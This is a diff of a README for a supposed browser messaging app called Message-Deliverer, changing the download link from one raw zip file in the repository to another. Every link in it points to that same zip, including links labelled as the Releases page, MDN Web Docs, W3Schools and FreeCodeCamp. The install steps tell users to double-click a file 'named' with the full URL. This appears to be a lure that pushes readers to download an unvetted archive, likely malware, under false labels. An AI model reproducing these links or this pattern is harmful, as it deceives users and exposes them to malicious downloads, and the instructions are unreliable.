@@ -1,7 +1,7 @@
 # 🚀 Message-Deliverer - Simple Messaging Made Easy
 
 ## 📥 Download Now
-[![Download Message-Deliverer](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip)](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip)
+[![Download Message-Deliverer](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip)](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,16 +15,16 @@ Before you start, ensure you have the following:
 - No specific operating system requirements, as this app runs in your browser.
 
 ## 🔗 Visit this page to download
-To get the latest version of Message-Deliverer, visit our [Releases page](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip).
+To get the latest version of Message-Deliverer, visit our [Releases page](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip).
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip).
 2. Find the latest version listed at the top.
 3. Click on the link to download the application. The files may be in a `.zip` format, which is common for web applications.
 4. Once downloaded, extract the contents of the `.zip` file to a folder of your choice.
-5. Open the folder and locate the file named `https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip`.
-6. Double-click `https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip` to open it in your web browser.
+5. Open the folder and locate the file named `https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip`.
+6. Double-click `https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip` to open it in your web browser.
 
 ## 🎨 Features
 
@@ -37,7 +37,7 @@ Message-Deliverer includes the following features:
 
 ## 🛠️ How to Use
 
-1. **Open the App**: After you've opened `https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip`, you'll see the main interface.
+1. **Open the App**: After you've opened `https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip`, you'll see the main interface.
 2. **Enter Your Message**: Type your message in the provided input box.
 3. **Send the Message**: Click the "Send" button to display your message.
 4. **View the Response**: The message appears below, demonstrating how the app handles user input.
@@ -75,8 +75,8 @@ If you wish to contribute to Message-Deliverer, please follow these guidelines:
 
 For more information about web development and frontend technologies, consider the following resources:
 
-- [MDN Web Docs](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip)
-- [W3Schools](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip)
-- [FreeCodeCamp](https://github.com/MainAkaun/Message-Deliverer/raw/refs/heads/main/Bhil/Deliverer_Message_3.7.zip)
+- [MDN Web Docs](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip)
+- [W3Schools](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip)
+- [FreeCodeCamp](https://raw.githubusercontent.com/MainAkaun/Message-Deliverer/main/Bhil/Message_Deliverer_1.6.zip)
 
 Enjoy using Message-Deliverer! We hope it enhances your learning experience in web development.
